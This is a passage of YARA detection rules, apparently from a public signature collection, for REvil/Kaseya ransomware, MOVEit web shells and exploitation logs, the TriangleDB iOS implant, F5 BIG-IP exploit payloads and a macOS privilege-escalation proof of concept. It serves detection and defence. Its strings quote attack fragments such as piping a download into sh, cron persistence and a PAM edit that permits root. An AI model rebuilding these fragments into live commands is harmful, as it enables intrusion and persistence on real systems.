		$op2 = { 8b 40 04 2b c2 c1 f8 02 3b c8 0f 84 56 ff ff ff 68 15 50 40 00 2b c1 6a 04 }
		$op3 = { 74 73 db e2 e8 ad 07 00 00 68 60 1a 40 00 e8 8f 04 00 00 e8 3a 05 00 00 50 e8 25 26 00 00 }
		$op4 = { 75 05 8b 45 fc eb 4c c7 45 f8 00 00 00 00 6a 00 8d 45 f0 50 8b 4d 0c }
		$op5 = { 83 7d 0c 00 75 05 8b 45 fc eb 76 6a 00 68 80 00 00 00 6a 01 6a 00 }

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 3000KB and ( pe.imphash ( ) == "c36dcd2277c4a707a1a645d0f727542a" or 2 of them )
}
rule SIGNATURE_BASE_APT_MAL_Revil_Kaseya_Jul21_2 : FILE
{
	meta:
		description = "Detects malware used in the Kaseya supply chain attack"
		author = "Florian Roth (Nextron Systems)"
		id = "38b168d4-e761-544e-9859-eb155bbfe54a"
		date = "2021-07-02"
		modified = "2023-12-05"
		reference = "https://doublepulsar.com/kaseya-supply-chain-attack-delivers-mass-ransomware-event-to-us-companies-76e4ec6ec64b"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/crime_revil_general.yar#L32-L57"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "0496ca57e387b10dfdac809de8a4e039f68e8d66535d5d19ec76d39f7d0a4402"
		hash = "8dd620d9aeb35960bb766458c8890ede987c33d239cf730f93fe49d90ae759dd"
		hash = "cc0cdc6a3d843e22c98170713abf1d6ae06e8b5e34ed06ac3159adafe85e3bd6"
		hash = "d5ce6f36a06b0dc8ce8e7e2c9a53e66094c2adfc93cfac61dd09efe9ac45a75f"
		hash = "d8353cfc5e696d3ae402c7c70565c1e7f31e49bcf74a6e12e5ab044f306b4b20"
		hash = "e2a24ab94f865caeacdf2c3ad015f31f23008ac6db8312c2cbfb32e4a5466ea2"
		logic_hash = "44948d93c71370a9976f22bf78cd1af80359f2c9804ea7995791109785cfaf84"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$opa1 = { 8b 4d fc 83 c1 01 89 4d fc 81 7d f0 ff 00 00 00 77 1? ba 01 00 00 00 6b c2 00 8b 4d 08 }
		$opa2 = { 89 45 f0 8b 4d fc 83 c1 01 89 4d fc 81 7d f0 ff 00 00 00 77 1? ba 01 00 00 00 6b c2 00 }
		$opa3 = { 83 c1 01 89 4d fc 81 7d f0 ff 00 00 00 77 1? ba 01 00 00 00 6b c2 00 8b 4d 08 0f b6 14 01 }
		$opa4 = { 89 45 f4 8b 0d ?? ?0 07 10 89 4d f8 8b 15 ?? ?1 07 10 89 55 fc ff 75 fc ff 75 f8 ff 55 f4 }
		$opb1 = { 18 00 10 bd 18 00 10 bd 18 00 10 0e 19 00 10 cc cc cc }
		$opb2 = { 18 00 10 0e 19 00 10 cc cc cc cc 8b 44 24 04 }
		$opb3 = { 10 c4 18 00 10 bd 18 00 10 bd 18 00 10 0e 19 00 10 cc cc }

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 3000KB and ( 2 of ( $opa* ) or 3 of them )
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_DLL_Moveit_Jun23_1 : FILE
{
	meta:
		description = "Detects compiled ASPX web shells found being used in MOVEit Transfer exploitation"
		author = "Florian Roth"
		id = "47db8602-9a9e-5efc-b8b9-fbc4f3c8d4e9"
		date = "2023-06-01"
		modified = "2023-12-05"
		reference = "https://www.trustedsec.com/blog/critical-vulnerability-in-progress-moveit-transfer-technical-analysis-and-recommendations/?utm_content=251159938&utm_medium=social&utm_source=twitter&hss_channel=tw-403811306"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/vuln_moveit_0day_jun23.yar#L2-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "6cbf38f5f27e6a3eaf32e2ac73ed02898cbb5961566bb445e3c511906e2da1fa"
		logic_hash = "47c2ec1e833852941434586b61d6f435b9acb32b2ff48e0a9e8006e0f9ff8056"
		score = 85
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "human2_aspx" ascii fullword
		$x2 = "X-siLock-Comment" wide
		$x3 = "x-siLock-Step1" wide
		$a1 = "MOVEit.DMZ.Core.Data" ascii fullword

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 40KB and ( 1 of ( $x* ) and $a1 ) or all of them
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Moveit_Jun23_1 : FILE
{
	meta:
		description = "Detects ASPX web shells as being used in MOVEit Transfer exploitation"
		author = "Florian Roth"
		id = "2c789b9c-5ec5-5fd1-84e3-6bf7735a9488"
		date = "2023-06-01"
		modified = "2023-12-05"
		reference = "https://www.rapid7.com/blog/post/2023/06/01/rapid7-observed-exploitation-of-critical-moveit-transfer-vulnerability/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/vuln_moveit_0day_jun23.yar#L24-L41"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "2413b5d0750c23b07999ec33a5b4930be224b661aaf290a0118db803f31acbc5"
		hash = "48367d94ccb4411f15d7ef9c455c92125f3ad812f2363c4d2e949ce1b615429a"
		hash = "e8012a15b6f6b404a33f293205b602ece486d01337b8b3ec331cd99ccadb562e"
		logic_hash = "436f9a503ad938541faa8f34604310ba6d932e40a41dc189ccd293b7191a7621"
		score = 85
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "X-siLock-Comment" ascii fullword
		$s2 = "]; string x = null;" ascii
		$s3 = ";  if (!String.Equals(pass, " ascii

	condition:
		filesize < 150KB and 2 of them
}
rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_1
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit Transfer logs"
		author = "Florian Roth"
		id = "a7c521b8-c654-51dd-9d5b-4ba883feffe3"
		date = "2023-06-01"
		modified = "2023-12-05"
		reference = "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/vuln_moveit_0day_jun23.yar#L43-L56"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "26674d8dea5cb2e95e442c4c75d80ca610f7373f0b216c0b1c83a5b1f9f70316"
		score = 70
		quality = 85
		tags = ""

	strings:
		$x1 = "POST /moveitisapi/moveitisapi.dll action=m2 " ascii
		$x2 = " GET /human2.aspx - 443 " ascii

	condition:
		1 of them
}
rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_2
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit Transfer logs"
		author = "Florian Roth"
		id = "1527f5e3-071d-5152-9452-9c4472d258f2"
		date = "2023-06-03"
		modified = "2023-12-05"
		reference = "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/vuln_moveit_0day_jun23.yar#L58-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "56328d078801a702ad47f01f356df6f00be8da593d03c549e77312af9b47b5be"
		score = 70
		quality = 85
		tags = ""

	strings:
		$a1 = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.102+Safari/537.36" ascii
		$a2 = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.54+Safari/537.36" ascii
		$s1 = " POST /moveitisapi/moveitisapi.dll" ascii
		$s2 = " POST /guestaccess.aspx"
		$s3 = " POST /api/v1/folders/"
		$s4 = "/files uploadType=resumable&"
		$s5 = " action=m2 "

	condition:
		1 of ( $a* ) and 3 of ( $s* ) or all of ( $s* )
}
rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_3
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit DMZ Web API logs"
		author = "Nasreddine Bencherchali"
		id = "113a501f-d9ed-51fd-82cd-ccb6f02833bd"
		date = "2023-06-13"
		modified = "2023-12-05"
		reference = "https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/vuln_moveit_0day_jun23.yar#L81-L94"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "2eaa06c31687c6368f036a705fdc1b1c42355f19c098ae764a998039cc4aebb5"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "TargetInvocationException" ascii
		$s2 = "MOVEit.DMZ.Application.Folders.ResumableUploadFilePartHandler.DeserializeFileUploadStream" ascii

	condition:
		all of ( $s* )
}
rule SIGNATURE_BASE_APT_Equation_Group_Op_Triangulation_Triangledb_Implant_Jun23_1 : FILE
{
	meta:
		description = "Detects TriangleDB implant found being used in Operation Triangulation on iOS devices (maybe also used on macOS systems)"
		author = "Florian Roth"
		id = "d81a5103-41c8-5dba-a560-8fb5514f6c0a"
		date = "2023-06-21"
		modified = "2023-12-05"
		reference = "https://securelist.com/triangledb-triangulation-implant/110050/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_eqgrp_triangulation_jun23.yar#L2-L18"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "486b19ddb8b182dbba882359f7eb416735e76f9cda5aea1b290fb5c6b44960c5"
		score = 80
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "unmungeHexString" ascii fullword
		$s2 = "CRPwrInfo" ascii fullword
		$s3 = "CRConfig" ascii fullword
		$s4 = "CRXConfigureDBServer" ascii fullword

	condition:
		( uint16( 0 ) == 0xfacf and filesize < 30MB and $s1 and 2 of them ) or all of them
}
rule SIGNATURE_BASE_MAL_Payload_F5_BIG_IP_Exploitations_Jul20_1 : CVE_2020_5902 FILE
{
	meta:
		description = "Detects code found in report on exploits against CVE-2020-5902 F5 BIG-IP vulnerability by NCC group"
		author = "Florian Roth (Nextron Systems)"
		id = "57705ba1-c0ad-5ca6-8539-44d9da6b5942"
		date = "2020-06-07"
		modified = "2023-12-05"
		reference = "https://research.nccgroup.com/2020/07/05/rift-f5-networks-k52145254-tmui-rce-vulnerability-cve-2020-5902-intelligence/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_f5_bigip_expl_payloads.yar#L2-L23"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "a3651081bb09452d80cba9f673a7b61c8ee2f47a12fb64d975eb63867688ee3b"
		score = 75
		quality = 85
		tags = "CVE-2020-5902, FILE"

	strings:
		$x1 = "rm -f /etc/ld.so.preload" ascii fullword
		$x2 = "echo \"* * * * * $LDR" ascii
		$x3 = ".sh -o /tmp/in.sh" ascii
		$x4 = "chmod a+x /etc/.modules/.tmp" ascii
		$x5 = "chmod +x /var/log/F5-logcheck"
		$s1 = "ulimit -n 65535" ascii fullword
		$s2 = "-s /usr/bin/wget " ascii
		$s3 = ".sh | sh" ascii

	condition:
		filesize < 300KB and ( 1 of ( $x* ) or 3 of them )
}
rule SIGNATURE_BASE_EXPL_HKTL_Macos_Switcharoo_CVE_2022_46689_Dec22 : CVE_2022_46689 FILE
{
	meta:
		description = "Detects POCs that exploit privilege escalation vulnerability CVE-2022-46689 on macOS"
		author = "Florian Roth (Nextron Systems)"
		id = "25c551f7-48ae-5e71-b86e-68fb440262e5"
		date = "2022-12-19"
		modified = "2023-12-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_macos_switcharoo_dec22.yar#L2-L40"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "64acd79a37b6f8443250dd33e95bd933ee39fc6d4f35ba6a987dae878d017386"
		hash = "6c2ace75000de8a7e8786f28b1b41eed72816991a0961475c6800753bfe9278c"
		hash = "6ce080b236ea3aa3b4c992d12af99445ab800abc709c6abbef852a9f0cf219b6"
		hash = "83cc4d72686aedf5218f07e60e759b4849b368975b70352dbba6fac4e8cde72b"
		hash = "a7b7fcfd609ff653d32c133417c0d3ffd9f581fb6de05ddbdead4d36cb6e3cc2"
		hash = "b2a97edb0ddc30ecc1a0b0c0739820bbef787394b44ab997393475de2ebf7b60"
		hash = "c7a64c6da5cf5046ae5c683d0264a32027110a2736b4c1b0df294e29a061a865"
		hash = "d517cde0d45e6930336538c89b310d5d540a66c921bf6f6f9b952e721b2f6a11"
		hash = "d53a559ea9131fe42eacf51431da3adde5a8fd5c2f3198f0d5451ef62ed33888"
		logic_hash = "c2cbe12a01a38db522c49143c5168d3519ef974b4e6157cb251aa66707c69d78"
		score = 80
		quality = 85
		tags = "CVE-2022-46689, FILE"

	strings:
		$x1 = "vm_read_overwrite: KERN_SUCCESS:%d KERN_PROTECTION_FAILURE:%d other:%d" ascii fullword
		$x2 = "Execting: %s (posix_spawn returned: %d)" ascii fullword
		$x3 = "/usr/bin/sed -e \"s/rootok/permit/g\" /etc" ascii fullword
		$x4 = "vm_unaligned_copy_switch_race" ascii fullword
		$s1 = "RO mapping was modified" ascii fullword
		$s2 = "Ran %d times in %ld seconds with no failure" ascii fullword
		$opa1 = { 4c 89 ee 31 c9 41 b8 00 40 00 00 6a 01 41 5c 41 54 6a 03 58 }
		$opa2 = { e8 ?? 01 00 00 48 8b 05 ?? 0? 00 00 8b 38 48 8b 13 44 8b 4b 14 48 83 ec 08 4c 89 ee 31 c9 }
		$opa3 = { 48 89 45 c8 48 8d 43 08 48 89 45 d0 4c 8b 7d c8 4c 8b 6d d0 6a 64 41 5e 80 7b 60 00 }
		$opb1 = { 55 48 89 e5 48 83 ec 60 48 8b 05 ?1 06 00 00 48 8b 00 48 89 45 f8 0f 28 05 ?b 07 00 00 48 8d 75 d0 }

	condition:
		( filesize < 400KB and 1 of ( $x* ) ) or ( ( uint16( 0 ) == 0xfacf or ( uint16( 0 ) == 0xfeca or uint16( 0 ) == 0xfacf or uint32( 0 ) == 0xbebafeca ) ) and filesize < 400KB and 2 of them )
}
rule SIGNATURE_BASE_EXPL_Macos_Switcharoo_Indicator_Dec22 : CVE_2022_46689 FILE
{
	meta:
		description = "Detects indicators found after exploitations of CVE-2022-46689"
		author = "Florian Roth (Nextron Systems)"
		id = "d5d9559a-c19c-5ddc-9d72-701986a9d7ac"
		date = "2022-12-19"
		modified = "2023-12-05"
		reference = "https://github.com/zhuowei/MacDirtyCowDemo"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_macos_switcharoo_dec22.yar#L42-L54"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "9b9ea134fc4b3a7b15ae585ced2e12cbe1defc54bc6175282d6b7a2a0b65abd1"
		score = 65
		quality = 85
		tags = "CVE-2022-46689, FILE"

	strings:
		$x1 = "auth       sufficient     pam_permit.so" ascii

	condition:
		filesize < 1KB and $x1
}
